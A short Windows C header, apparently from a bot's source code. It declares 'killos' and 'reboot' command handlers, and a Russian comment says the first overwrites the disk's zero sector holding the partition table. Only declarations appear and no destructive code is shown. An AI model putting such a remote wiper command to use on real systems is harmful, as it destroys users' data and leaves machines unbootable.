#ifndef KillOs_RebootH
#define KillOs_RebootH
#include <windows.h>


	const PCHAR killos = "killos";
	const PCHAR Reboot_System = "reboot";
	
	// перезаписывает нулевой сектор, а там находиться Таблица разделов  
	bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);
	// перегружаем
	bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);

	bool KillOs();
	void Reboot();
#endif